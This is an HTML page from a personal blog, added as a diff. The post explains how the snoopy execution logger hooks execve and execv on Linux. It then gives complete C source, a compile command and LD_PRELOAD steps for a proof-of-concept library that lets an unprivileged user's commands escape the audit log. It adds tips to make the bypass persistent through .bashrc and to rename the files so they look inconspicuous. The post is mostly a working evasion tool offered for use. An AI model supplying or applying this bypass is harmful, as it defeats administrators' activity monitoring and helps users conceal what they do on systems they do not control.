@@ -1,0 +1,187 @@
+---
+redirect_from: /post/4921812115/bypassing-snoopy-logging
+---
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>Bypassing snoopy logging &middot; Ryan A. Chapman</title>
+        <meta name="description" content="">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.17-DEV" />
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" href="http://test2.rchapman.org/css/normalize.css">
+        <link rel="stylesheet" href="http://test2.rchapman.org/css/highlight.css">
+        <link rel="stylesheet" href="http://test2.rchapman.org/css/style.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    </head>
+    <body>
+        
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'XXX', 'auto');
+ga('send', 'pageview');
+</script>
+
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a title="Ryan A. Chapman" href="http://test2.rchapman.org/">Ryan A. Chapman</a>
+                            </h1>
+                        
+                        <a class="button-square" href="http://test2.rchapman.org/index.xml"><i class="fa fa-rss"></i></a>
+                        
+                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/ryanchapman">
+                                <i class="fa fa-twitter"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/ryanchapman">
+                                <i class="fa fa-github-alt"></i>
+                            </a>
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="LinkedIn" title="LinkedIn" href="https://linkedin.com/in/ryanachapman/">
+                                <i class="fa fa-linkedin"></i>
+                            </a>
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Google+" title="Google+" href="https://plus.google.com/u/0/116175235833210820781">
+                                <i class="fa fa-google-plus"></i>
+                            </a>
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+    <li class="site-nav-item">
+        <a title="Blog" href="/">Blog</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Projects" href="/project/">Projects</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Contact" href="/page/contact/">Contact</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="About" href="/page/about/">About</a>
+    </li>
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container">
+        <header class="post-header">
+    <h1 class="post-title">Bypassing snoopy logging</h1>
+    
+    Published Fri, Apr 15, 2011<br/>
+</header>
+
+
+        <div class="post-content clearfix">
+    
+
+    <!-- Keywords: snoopy logging circumvent bypass disable exploit get around --><br /><i>snoopy v1.8.0, CentOS 5.5 64-bit x86_64 (Linux kernel 2.6.18)</i><br><br><br /><br /><p><br />I came across the snoopy logging program today, which is a way for system administrators to log every single program that is executed on a system.  While the authors promote it's use for troubleshooting purposes, some system administrators use it for logging user activity.  The snoopy authors advise against this use, because it is easily circumvented.  I couldn't find any articles on the internets on how to circumvent it, so I decided it would be fun to dive in and try to figure it out.<br /></p><br /><br /><p><br />It turned out to be fairly easy.  Let me start with how you detect if snoopy logging is enabled on a system you use.  Logged in as any user, run the command:<br /></p><br /><br /><pre>ldd &#96;which ls&#96;</pre><br /><br />On a particular system I use at work, this is how I discovered snoopy was in place.  The output on that machine looked like this:<br /><br /><pre><br />[ryan@buggy ~]# ldd `which ls`<br />        /usr/local/lib/snoopy.so (0x00002af2d1210000)<br />        librt.so.1 => /lib64/librt.so.1 (0x00002af2d1412000)<br />        libacl.so.1 => /lib64/libacl.so.1 (0x00002af2d161b000)<br />        libselinux.so.1 => /lib64/libselinux.so.1 (0x00002af2d1822000)<br />        libc.so.6 => /lib64/libc.so.6 (0x00002af2d1a3a000)<br />        libdl.so.2 => /lib64/libdl.so.2 (0x00002af2d1d91000)<br />        libpthread.so.0 => /lib64/libpthread.so.0 (0x00002af2d1f96000)<br />        /lib64/ld-linux-x86-64.so.2 (0x00002af2d0ff3000)<br />        libattr.so.1 => /lib64/libattr.so.1 (0x00002af2d21b1000)<br />        libsepol.so.1 => /lib64/libsepol.so.1 (0x00002af2d23b5000)<br /></pre><br /><br /><pre><br />[ryan@buggy ~]# tail /var/log/secure<br />Apr 13 12:03:07 buggy snoopy[19511]: [uid:544 sid:10430 tty:/dev/pts/2 cwd:/home/ryan filename:/usr/bin/ldd]: ldd /bin/ls  [uid:544 sid:10430 tty:/dev/pts/2 cwd:/home/ryan filename:/usr/bin/ldd]: ldd /bin/ls <br /></pre><br /><br />Easy to see I'm being spied on.  Let's take a look at a bit of the snoopy source to find out how they are doing it:<br><br><br /><br /><tt><b>From snoopy.c in snoopy version 1.8.0</b></tt><br /><br /><pre><br />    #if defined(RTLD_NEXT)<br />    #  define REAL_LIBC RTLD_NEXT<br />    #else<br />    #  define REAL_LIBC ((void *) -1L)<br />    #endif<br /><br />    #define FN(ptr,type,name,args)  ptr = (type (*)args)dlsym (REAL_LIBC, name)<br /><br />    int execve(const char *filename, char *const argv[], char *const envp[])<br />    {<br />            static int (*func)(const char *, char **, char **);<br /><br />            FN(func,int,"execve",(const char *, char **const, char **const));<br />            snoopy_log(filename, argv);<br /><br />            return (*func) (filename, (char**) argv, (char **) envp);<br />    }<br /><br />    int execv(const char *filename, char *const argv[]) <br />    {<br />            static int (*func)(const char *, char **);<br /><br />            FN(func,int,"execv",(const char *, char **const));<br />            snoopy_log(filename, argv);<br />    <br />            return (*func) (filename, (char **) argv);<br />    }<br /></pre><br /><br /><p><br />Now that you've seen some code, let me explain what in the world is going on.  The snoopy library is preloaded before any other libraries, giving it the opportunity to override the execv(3) and execve(3) system calls with it's own.  This means that any time a dynamically-linked program is executed, it will call the snoopy library's version of exec() or execve().  Snoopy simply logs the execution via the <tt>snoopy_log()</tt> function and then executes the next execv() or execve() in the dynamic library chain, which is most likely the libc version.<br /></p><br /><br /><p><br />Does this add overhead?  Maybe.  I noticed that in version 1.8.0 of snoopy, there is a log filtering mechanism, which seems to spawn a bash shell to call a filtering script.  While I didn't test the performance, one would think that spawning a bash shell on every execv() or execve() call would add some serious overhead on a busy machine.  If anyone tests this out, please relay the results back to me.<br /></p><br /><br><br><br /><p><br />Let's now look into disabling snoopy (without being root). We'll take advantage of the same thing that snoopy does: we can load a library ahead of all other libraries.  By creating a library that implements execv() and execve(), we can ensure that our version of those system calls will be executed before any others.  The only thing our execv() and execve() functions do is lookup the memory address of the <i><b>REAL</b></i> libc versions of execv() and execve() and call them directly, effectively bypassing snoopy altogether (even though the snoopy lib will still be loaded).  It does this by calling dlopen() to get a handle to the libc library, then obtaining a function pointer to the execv and execve symbols in that library.<br /></p><br /><br /><pre><br /><br />     BEFORE (SNOOPY ENABLED)                       AFTER (SNOOPY BYPASSED)<br /><br />   DYNAMICALLY LINKED PROGRAM                     DYNAMICALLY LINKED PROGRAM<br />       (e.g. /bin/ls)                                   (e.g. /bin/ls)<br />              |                                                |<br />              |                                                |<br />             \ /                                              \ /<br />    +----------------------+                       +-----------------------+<br />    |      snoopy.so       |                       |       bypass.so       |<br />    | execv()     execve() |                       | execv()      execve() |<br />    +---|-------------|----+                       +---|--------------|----+<br />        |             |                     +----------+              +----------+<br />    +---|-------------|----+                |                                    |<br />    |   |  libc.so    |    |                |      +-----------------------+     |<br />    |  \ /           \ /   |                |      |      snoopy.so        |     |<br />    | execv()     execve() |                |      | execv()      execve() |     |<br />    +----------------------+                |      +-----------------------+     |<br />                                            |                                    |<br />                                            +----------+              +----------+<br />                                                   +---|--------------|----+<br />                                                   |   |  libc.so     |    |<br />                                                   |  \ /            \ /   |<br />                                                   | execv()      execve() |<br />                                                   +-----------------------+<br /><br /><br />This diagram is not 100% accurate, but serves to illustrate how the chain of events occur.<br /></pre><br /><br><br><br><br /><br /><br /><p><br />BYPASS PROCEDURE<br /></p><br />1. Drop the following into a file named <tt>bypass.c</tt>:<br /></p><br /><br /><pre><br />/*<br /> * Proof of concept to bypass snoopy logging<br /> *<br /> * Many parts of the code came directly from the snoopy source itself.<br /> *<br /> * Ryan A. Chapman<br /> * Wed Apr 13 13:28:10 MDT 2011<br /> */<br /><br />#define _GNU_SOURCE<br />#include &lt;dlfcn.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;stdarg.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;syslog.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;errno.h&gt;<br /><br />#if defined(RTLD_NEXT)<br />#  define REAL_LIBC RTLD_NEXT<br />#else<br />#  define REAL_LIBC ((void *) -1L)<br />#endif<br /><br />#define FN(ptr,type,name,args)  ptr = (type (*)args)dlsym (REAL_LIBC, name)<br />#define FN_HANDLE(handle, ptr,type,name,args)  ptr = (type (*)args)dlsym (handle, name)<br /><br />int execve(const char *filename, char *const argv[], char *const envp[])<br />{<br />    Dl_info info;<br />    void *handle = dlopen("/lib64/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    if(handle == NULL)<br />        handle = dlopen("/lib/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    static int (*func)(const char *, char **, char **);<br /><br />    FN_HANDLE(handle,func,int,"execve",(const char *, char **, char **));<br />    return (*func) (filename, (char**) argv, (char **) envp);<br />}<br /><br />/* Put the libc version of execv back in place */<br />int execv(const char *filename, char *const argv[])<br />{<br />    Dl_info info;<br />    void *handle = dlopen("/lib64/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    if(handle == NULL)<br />        handle = dlopen("/lib/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    static int (*func)(const char *, char **);<br /><br />    FN_HANDLE(handle,func,int,"execv",(const char *, char **));<br />    return (*func) (filename, (char **) argv);<br />}<br /></pre><br /><br /><p><br />2. Now compile it with:<br /></p><br /><br /><tt>gcc  -nostartfiles -shared -O3 -fomit-frame-pointer -fPIC bypass.c -obypass.so -ldl</tt><br /><br /><p><br />You'll end up with a shared library called <tt>bypass.so</tt>.<br /></p><br /><br /><p><br />3. Finally, start a bash shell with the bypass.so library loaded:<br /></p><br /><br /><tt>export LD_PRELOAD=/full/path/to/bypass.so<br />/bin/bash</tt><br /><br /><p><br />Presto!  You're commands are no longer being logged in snoppy.  If you wanted to automate it, you could put the export and bash commands at the bottom of your .bashrc<br><br />Oh, and you may want to rename it from bypass.c and bypass.so to something a little more inconspicuous.<br /></p><br /><br />Enjoy!<br /><br /><!-- Technorati Tags Start --><br /><p>Technorati Tags:<br /><a href="http://technorati.com/tag/bypass" rel="tag">bypass</a>, <a href="http://technorati.com/tag/circumvent" rel="tag">circumvent</a>, <a href="http://technorati.com/tag/disable" rel="tag">disable</a>, <a href="http://technorati.com/tag/exploit" rel="tag">exploit</a>, <a href="http://technorati.com/tag/get%20around" rel="tag">get around</a>, <a href="http://technorati.com/tag/snoopy" rel="tag">snoopy</a>, <a href="http://technorati.com/tag/snoopy%20logger" rel="tag">snoopy logger</a><br /></p><br /><!-- Technorati Tags End --><br /><div class="blogger-post-footer">&nbsp;</div>
+
+
+</div>
+
+
+        <footer class="post-footer clearfix">
+    
+
+    <div class="share">
+        <a class="icon-twitter" href="http://twitter.com/share?text=Bypassing%20snoopy%20logging&url=http%3a%2f%2ftest2.rchapman.org%2fposts%2fBypassing_snoopy_logging%2f"
+            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+            <i class="fa fa-twitter"></i>
+            <span class="hidden">Twitter</span>
+        </a>
+
+        <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2ftest2.rchapman.org%2fposts%2fBypassing_snoopy_logging%2f"
+            onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+            <i class="fa fa-facebook"></i>
+            <span class="hidden">Facebook</span>
+        </a>
+
+        <a class="icon-google-plus" href="https://plus.google.com/share?url=http%3a%2f%2ftest2.rchapman.org%2fposts%2fBypassing_snoopy_logging%2f"
+           onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+           <i class="fa fa-google-plus"></i>
+            <span class="hidden">Google+</span>
+        </a>
+    </div>
+</footer>
+
+            <div class="comments">
+        <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'blog-rchapman-org';
+    var disqus_identifier = 'http:\/\/test2.rchapman.org\/posts\/Bypassing_snoopy_logging\/';
+    var disqus_title = 'Bypassing snoopy logging';
+    var disqus_url = 'http:\/\/test2.rchapman.org\/posts\/Bypassing_snoopy_logging\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </div>
+
+    </article>
+</div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a title="Ryan A. Chapman" href="http://test2.rchapman.org/">Ryan A. Chapman</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#">
+                        <i class="fa fa-angle-up"></i>
+                    </a>
+                </div>
+
+                <p class="footer-copyright">
+                    <span>&copy; 2016 / Powered by <a href="http://gohugo.io/">Hugo</a> / <a href="https://github.com/ryanchapman/test2">Blog source</a></span>
+                </p>
+                <p class="footer-copyright">
+                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
+                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="http://test2.rchapman.org/js/jquery-1.11.3.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
+        <script src="http://test2.rchapman.org/js/jquery.fitvids.js"></script>
+        <script src="http://test2.rchapman.org/js/scripts.js"></script>
+    </body>
+</html>
+
